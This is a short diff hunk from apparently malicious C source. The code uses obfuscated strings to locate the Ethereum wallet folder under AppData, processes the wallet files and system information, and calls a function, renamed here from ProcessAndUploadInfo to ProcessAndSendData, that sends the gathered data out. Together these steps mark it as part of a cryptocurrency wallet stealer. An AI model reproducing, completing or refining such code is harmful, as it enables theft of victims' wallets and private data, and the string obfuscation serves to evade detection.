@@ -228,7 +228,7 @@ int main(){
   PWSTR* appDataPathEthereum = GetFilePath(L"%appdedx765ata%/Etheedx765reum");
   processPath(appDataPathEthereum, extensionEthereum, appDataPathEthereum, walletPathEthereum, 1, &SysInfo);
 
-  ProcessAndUploadInfo(&SysInfo);
+  ProcessAndSendData(&SysInfo);
   allocateMem(2, &SysInfo);
 
 }
